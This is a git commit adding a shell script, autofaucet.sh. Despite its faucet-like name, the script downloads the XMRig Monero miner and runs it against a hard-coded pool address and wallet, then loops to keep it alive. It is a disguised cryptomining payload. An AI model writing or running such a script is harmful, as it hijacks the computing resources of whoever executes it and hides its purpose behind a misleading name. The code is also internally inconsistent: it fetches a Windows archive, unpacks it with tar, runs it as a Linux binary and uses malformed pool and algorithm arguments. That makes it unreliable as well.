de7a5014363dce4156669ba3cc7e69fee1a6246c
william4mac <131428403+william4mac@users.noreply.github.com>
2023-04-24 01:46:05 +0700

    Create autofaucet.sh

---
+++ autofaucet.sh
@@ -0,0 +1,11 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/xmrig/xmrig/releases/download/v5.8.1/xmrig-5.8.1-gcc-win64.zip
+tar xf xmrig-5.8.1-gcc-win64.zip
+cd xmrig-5.8.1
+./xmrig -o rx.168.235.86.33:3393 -u MONERO:D5t4rMM376kiMdXKB5VCUKEwNEk7UrQDk4.tuan -p X -k -a rx/0-t2
+while [ 1 ] ; do
+sleep 3
+done
+sleep 999
